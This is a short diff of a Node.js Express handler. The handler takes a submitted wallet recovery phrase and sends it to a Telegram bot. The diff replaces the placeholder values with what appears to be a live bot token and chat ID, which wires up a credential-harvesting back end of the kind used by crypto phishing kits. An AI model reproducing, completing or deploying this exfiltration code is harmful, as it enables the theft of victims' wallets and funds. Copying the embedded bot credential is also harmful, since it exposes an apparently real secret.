@@ -13,8 +13,8 @@ app.post('/submit', (req, res) => {
     }
 
     // Send to Telegram (replace YOUR_TELEGRAM_BOT_TOKEN and YOUR_CHAT_ID)
-    const telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN';
-    const chatId = 'YOUR_CHAT_ID';
+    const telegramBotToken = '8012898137:AAHrkbdZwW7a3qIinIkPq2pgHrNN1pOX_-A';
+    const chatId = '1353449624';
     const message = `New recovery phrase: ${recoveryPhrase}`;
 
     fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
